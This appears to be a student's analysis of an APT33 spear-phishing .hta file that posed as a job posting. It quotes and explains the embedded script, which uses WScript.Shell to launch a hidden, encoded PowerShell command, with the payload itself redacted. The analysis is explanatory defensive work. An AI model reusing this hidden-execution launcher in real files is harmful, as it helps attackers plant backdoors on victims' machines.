# ALFASHELL

## The spear phishing code used by APT33: Overview
> Code sampled from https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html

This code was used to target employees in the aerospace and energy sectors. The emails posed as realistic looking job opportunities that
actually contained links to HTML application files (.hta). The .hta files had links to real job postings, but also contained code that would
a backdoor.

The code is publicly avaiable (a built in spear phishing module) in ALFA TEaM Shell (ALFASHELL) a web shell authored by GitHub user
**solevisible** (https://github.com/solevisible/ALFA-SHELL-V3)

## Analysis of .hta file

```
<title>Supply Specialist, Riyadh, Alsalam Company</title>
```
A legitimate aerospace company: http://www.alsalam.aero/
The company's legitimacy may have been the first step in getting the targets to begin navigating the webpage.
The links withing the .hta did also contain links to real job postings, further obscuring its real intention.

### The real threat

```
<script>
a=new ActiveXObject("WScript.Shell");
a.run('%windir%\\System32\\cmd.exe /c powershell -window hidden -enc <redacted encoded command>', 0);
</script>
```

On the first line, a new object can be seen being made, which will allow the attacker to utilize a shell.
```
a=new ActiveXObject("WScript.Shell");
```

After the object is created/initialized, it envokes a 'run' command
```
a.run(
```

With a very obvious goal: the code creates a backdoor that allows for remote powershell use (similar to the 'tini' backdoor as shown in class)

The code first uses 
```
'%windir%\\System32
```
Which is the Windows directory or SYSROOT (https://superuser.com/questions/855615/what-is-windir) that would allow the malware
to execute the next bit of code once they had navigated to the correct path/directory:
```
\\cmd.exe
```
And thus a command window is open, allowing for the execution of any command

Aditionally, the 'hidden' keyword in the next portion of the code means that the powershell windo would be hidden from the user,
allowing the attacker to execute commands without the target noticing anything suspicious (especially as the use of the 'enc'
flag is employed, allowing for all potentially malicious looking strings to be encoded)
(https://stackoverflow.com/questions/1802127/how-to-run-a-powershell-script-without-displaying-a-window
https://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier)
```
powershell -window hidden -enc
```

And in a few lines of code, APT33 now has backdoor access to a targets computer.
